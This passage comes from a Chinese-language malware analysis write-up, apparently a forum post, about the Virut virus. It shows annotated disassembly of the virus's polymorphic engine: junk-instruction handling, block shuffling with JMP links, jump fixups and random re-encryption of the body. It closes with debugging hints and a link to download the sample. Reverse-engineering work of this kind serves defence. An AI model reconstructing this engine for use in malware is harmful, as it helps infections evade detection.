.remote:001B3D92                 loc_1B3D92:                       ; CODE XREF: sub_1B37FD+46Bj  

.remote:001B3D92                                             ; sub_1B37FD+47Aj ...  

.remote:001B3D92 01C C6 85 E1 3D 1B 00+                        mov     byte ptr ss:(loc_1B3DE0+1)[ebp], 0B3h  

.remote:001B3D99 01C 51                                       push    ecx  

.remote:001B3D9A 020 29 4C 24 08                               sub     [esp+20h+var_18], ecx  

.remote:001B3D9E 020 F3 A4                                     rep movsb  

.remote:001B3DA0 020 59                                       pop     ecx  

.remote:001B3DA1 01C EB 19                                     jmp     short loc_1B3DBC  

.remote:001B3DA3                 ; ---------------------------------------------------------------------------  

.remote:001B3DA3  

.remote:001B3DA3                 loc_1B3DA3:                       ; CODE XREF: sub_1B37FD+454j  

.remote:001B3DA3 01C 57                                       push    edi  

.remote:001B3DA4 020 F7 1C 24                                  neg     [esp+20h+var_20]  

.remote:001B3DA7 020 E8 4A F4 FF FF                          call    get_rabish  

.remote:001B3DAC 020 59                                       pop     ecx  

.remote:001B3DAD 01C 03 CF                                     add     ecx, edi  

.remote:001B3DAF 01C 29 8D D2 54 1B 00                          sub     ss:number_rablish[ebp], ecx ; 花指令总数减少  

.remote:001B3DB5  

.remote:001B3DB5                 loc_1B3DB5:                       ; CODE XREF: sub_1B37FD+4F9j  

.remote:001B3DB5                                             ; sub_1B37FD+58Cj  

.remote:001B3DB5 01C C6 85 E1 3D 1B 00+                        mov     byte ptr ss:(loc_1B3DE0+1)[ebp], 0ABh ; 修改指令为 bts  

.remote:001B3DBC  

.remote:001B3DBC                 loc_1B3DBC:                       ; CODE XREF: sub_1B37FD+5A4j  

.remote:001B3DBC 01C 8B 04 24                                  mov     eax, [esp+1Ch+var_1C]  

.remote:001B3DBF 01C 66 01 8C C5 2A 17+                        add     ss:block.n_NumberOfOpcode[ebp+eax*8], cx ; 变形后的 OPCODE 数增加  
```



```asm
.remote:001B3DC7 01C 8D 57 FF                     lea     edx, [edi-1]  

.remote:001B3DCA 01C E3 1E                         jecxz   short loc_1B3DEA  

.remote:001B3DCC 01C 2B 95 CE 54 1B 00             sub     edx, ss:virut_start_in_file_off[ebp]  

.remote:001B3DD2 01C 3B 95 20 1B 1B 00             cmp     edx, ss:new_body_offset[ebp] ; 变形后的 body 在 virut 中的偏移  

.remote:001B3DD8 01C 76 06                         jbe     short loc_1B3DE0  

.remote:001B3DDA 01C 81 EA 34 3D 00 00             sub     edx, 3D34h       ; 3d34 body 的大小  

.remote:001B3DE0  

.remote:001B3DE0                          loc_1B3DE0:                       ; CODE XREF: sub_1B37FD+5DBj  

.remote:001B3DE0                                                        ; sub_1B37FD+5EBj  

.remote:001B3DE0                                                        ; DATA XREF: ...  

.remote:001B3DE0 01C 0F B3 95 44 1A 1B+          btr     ss:is_rabish[ebp], edx ;  位测试为 1 的则是垃圾指令  

.remote:001B3DE7 01C 4A                          dec     edx  

.remote:001B3DE8 01C E2 F6                       loop    loc_1B3DE0  

.remote:001B3DEA  

.remote:001B3DEA                          loc_1B3DEA:                       ; CODE XREF: sub_1B37FD+5CDj  

.remote:001B3DEA 01C 58                          pop     eax  

.remote:001B3DEB 018 59                          pop     ecx  

.remote:001B3DEC 014 E9 4D FE FF FF              jmp     loc_1B3C3E  

.remote:001B3DF1                          ; ---------------------------------------------------------------------------  

.remote:001B3DF1  

.remote:001B3DF1                          loc_1B3DF1:                       ; CODE XREF: sub_1B37FD+43Cj  

.remote:001B3DF1                                                        ; sub_1B37FD+443j  

.remote:001B3DF1 014 59                          pop     ecx  

.remote:001B3DF2 010 F6 84 C5 2B 17 1B+          test    byte ptr ss:(block.n_NumberOfOpcode+1)[ebp+eax*8], 80h  

.remote:001B3DFA 010 75 0D                       jnz     short loc_1B3E09 ; 指令块处理完了  

.remote:001B3DFC 010 B0 EB                       mov     al, 0EBh         ; 看指令块 是不是以跳转指令或者 ret 结尾的  

.remote:001B3DFE 010 AA                         stosb  

.remote:001B3DFF 010 83 C8 FF                   or      eax, 0FFFFFFFFh  

.remote:001B3E02 010 E8 21 E4 FF FF              call    rand_mul         ; 返回[0:eax)  

.remote:001B3E07 010 92                         xchg    eax, edx         ; 不是的话  需要用 JMP 来链接乱序后的指令块  

.remote:001B3E08 010 AB                         stosd                     ; 生成 JMP 指令  

.remote:001B3E09  

.remote:001B3E09                          loc_1B3E09:                       ; CODE XREF: sub_1B37FD+5FDj  

.remote:001B3E09 010 FE C9                       dec     cl  

.remote:001B3E0B 010 0F 85 CC FD FF FF            jnz     loc_1B3BDD  

3.修复 操作数 一方面通过 `reloc_jmp` 数组 里的描述 来修复 另一方面 还需要修复 变形后增加的那些跳转指令  

.remote:001B3E11 010 8B D7                       mov     edx, edi         ; 全部的指令块都处理完了后  

.remote:001B3E13 010 2B 95 CE 54 1B 00            sub     edx, ss:virut_start_in_file_off[ebp]  

.remote:001B3E19 010 89 95 1C 1B 1B 00            mov     ss:virut_length[ebp], edx ; 更新 virut_length  

.remote:001B3E1F  

.remote:001B3E1F                          loc_1B3E1F:                       ; CODE XREF: sub_1B37FD+660j  

.remote:001B3E1F 010 0F B7 84 29 30 1B+           movzx   eax, reloc_jmp.TarOffset[ecx+ebp] ; 开始修补 JMP 指令后的操作数  

.remote:001B3E27 010 E8 C8 F8 FF FF              call    ensure_block     ; 返回 eax 中的值在变形后的偏移  

.remote:001B3E2C 010 50                          push    eax  

.remote:001B3E2D 014 0F B7 84 29 2E 1B+          movzx   eax, reloc_jmp.NexOffset[ecx+ebp]  

.remote:001B3E35 014 48                          dec     eax  

.remote:001B3E36 014 E8 B9 F8 FF FF              call    ensure_block     ; 返回 eax 中的值在变形后的偏移  

.remote:001B3E3B 014 40                          inc     eax  

.remote:001B3E3C 014 29 04 24                   sub     [esp], eax  

.remote:001B3E3F 014 0F B7 84 29 2C 1B+          movzx   eax, word ptr reloc_jmp.o_offset[ecx+ebp]  

.remote:001B3E47 014 E8 A8 F8 FF FF              call    ensure_block     ; 返回 eax 中的值在变形后的偏移  

.remote:001B3E4C 014 03 85 CE 54 1B 00            add     eax, ss:virut_start_in_file_off[ebp]  

.remote:001B3E52 014 8F 00                       pop     dword ptr [eax]  

.remote:001B3E54 010 83 C1 06                   add     ecx, 6  

.remote:001B3E57 010 81 F9 E4 00 00 00            cmp     ecx, 0E4h  

.remote:001B3E5D 010 72 C0                       jb      short loc_1B3E1F ; 开始修补 JMP 指令后的操作数  

.remote:001B3E5F 010 8B BD CE 54 1B 00            mov     edi, ss:virut_start_in_file_off[ebp]  

.remote:001B3E65 010 8D B5 24 17 1B 00            lea     esi, block.o_NumberOfOpcode[ebp]  

.remote:001B3E6B 010 03 BD 20 1B 1B 00            add     edi, ss:new_body_offset[ebp] ; 变形后的 body 在 virut 中的偏移  

.remote:001B3E71 010 68 08 04 00 00            push    408h  

.remote:001B3E76 014 81 C7 3C 05 00 00            add     edi, 53Ch  

.remote:001B3E7C 014 59                          pop     ecx  

.remote:001B3E7D 010 F3 A4                       rep movsb  

.remote:001B3E7F 010 33 C9                       xor     ecx, ecx         ; 复制 block 结构数组  

.remote:001B3E81  

.remote:001B3E81                          loc_1B3E81:                       ; CODE XREF: sub_1B37FD+6D9j  

.remote:001B3E81 010 F6 84 CD 2B 17 1B+          test    byte ptr ss:(block.n_NumberOfOpcode+1)[ebp+ecx*8], 80h  

.remote:001B3E89 010 75 43                       jnz     short loc_1B3ECE  

.remote:001B3E8B 010 0F B7 94 CD 2A 17+          movzx   edx, ss:block.n_NumberOfOpcode[ebp+ecx*8] ; 修补指令块间的 JMP 即刚刚添加的 JMP 指令操作数  

.remote:001B3E93 010 0F B7 84 CD 28 17+          movzx   eax, ss:block.n_offsetStart[ebp+ecx*8]  

.remote:001B3E9B 010 81 E2 FF 7F 00 00            and     edx, 7FFFh  

.remote:001B3EA1 010 8D 44 02 02                 lea     eax, [edx+eax+2]  

.remote:001B3EA5 010 0F B7 94 CD 30 17+          movzx   edx, ss:next_block.n_offsetStart[ebp+ecx*8]  

.remote:001B3EAD 010 2B D0                       sub     edx, eax  

.remote:001B3EAF 010 03 85 CE 54 1B 00            add     eax, ss:virut_start_in_file_off[ebp]  

.remote:001B3EB5 010 83 FA 80                   cmp     edx, 0FFFFFF80h  

.remote:001B3EB8 010 7C 0A                       jl      short loc_1B3EC4  

.remote:001B3EBA 010 83 FA 7F                   cmp     edx, 7Fh         ; 跳转的范围  

.remote:001B3EBD 010 7F 05                       jg      short loc_1B3EC4  

.remote:001B3EBF 010 88 50 FF                   mov     [eax-1], dl      ; 存放短跳转操作数  

.remote:001B3EC2 010 EB 0A                       jmp     short loc_1B3ECE  

.remote:001B3EC4                          ; ---------------------------------------------------------------------------  

.remote:001B3EC4  

.remote:001B3EC4                          loc_1B3EC4:                       ; CODE XREF: sub_1B37FD+6BBj  

.remote:001B3EC4                                                        ; sub_1B37FD+6C0j  

.remote:001B3EC4 010 83 EA 03                   sub     edx, 3  

.remote:001B3EC7 010 C6 40 FE E9                 mov     byte ptr [eax-2], 0E9h ; 范围太大  修改指令为长跳转  

.remote:001B3ECB 010 89 50 FF                   mov     [eax-1], edx  

.remote:001B3ECE  

.remote:001B3ECE                          loc_1B3ECE:                       ; CODE XREF: sub_1B37FD+68Cj  
```



`.remote:001B3ECE`  ; `sub_1B37FD+6C5j`

`.remote:001B3ECE` `010` `FE C1`  `inc` `cl`

`.remote:001B3ED0` `010` `3A 8D 23 17 1B 00`  `cmp` `cl, ss:number_block[ebp]` ; 多态加密时 分块的个数

`.remote:001B3ED6` `010` `72 A9`  `jb` `short loc_1B3E81`

### 4.随机加密 body

`.remote:001B3ED8` `010` `B8 00 00 01 00`  `mov` `eax, 10000h`

`.remote:001B3EDD` `010` `E8 46 E3 FF FF`  `call` `rand_mul`  ; 返回`[0:eax)`

`.remote:001B3EE2` `010` `52`  `push` `edx`  ; 随机出加密 body 的 key

`.remote:001B3EE3` `014` `B8 4A 00 00 00`  `mov` `eax, 4Ah`

`.remote:001B3EE8` `014` `E8 07 F8 FF FF`  `call` `ensure_block`  ; 返回 `eax` 中的值在变形后的偏移

`.remote:001B3EED` `014` `03 85 CE 54 1B 00`  `add` `eax, ss:virut_start_in_file_off[ebp]`

`.remote:001B3EF3` `014` `5A`  `pop` `edx`

`.remote:001B3EF4` `010` `66 89 10`  `mov` `[eax], dx`  ; 更新 KEY

`.remote:001B3EF7` `010` `0F B7 8D 28 17 1B+`  `movzx` `ecx, ss:block.n_offsetStart[ebp]`

`.remote:001B3EFE` `010` `8B 85 20 1B 1B 00`  `mov` `eax, ss:new_body_offset[ebp]` ; 变形后的 body 在 virut 中的偏移

`.remote:001B3F04` `010` `03 8D EE 54 1B 00`  `add` `ecx, ss:virut_start_in_section_rva[ebp]`

`.remote:001B3F0A` `010` `03 85 CE 54 1B 00`  `add` `eax, ss:virut_start_in_file_off[ebp]`

`.remote:001B3F10` `010` `89 8D 16 55 1B 00`  `mov` `ss:dword_1B5516[ebp], ecx`

`.remote:001B3F16` `010` `E8 31 D1 FF FF`  `call` `decode`  ; 到此多态变形就结束了

说明:`virut` 感染实际上是多种方式感染的 通过标志位来决定的  这个样本  `virut` 是修改了  导入表的引用

`call` `dword ptr[api]`  变成了  `jmp virut`  附件中的样本直接运行 不会有任何现象的  因为 

没有运行到 `virut` 修改的那个引用 如果要调试 直接用 `OD` 新建 `EIP` 到 `01007206`

### 上传的附件

![](img/fb8ade91a9e54b7bd6690c3ae5b1d1cc.jpg)

`virut.zip` [附件请到论坛下载：[`bbs.pediy.com/showthread.php?t=97877`](http://bbs.pediy.com/showthread.php?t=97877) ]

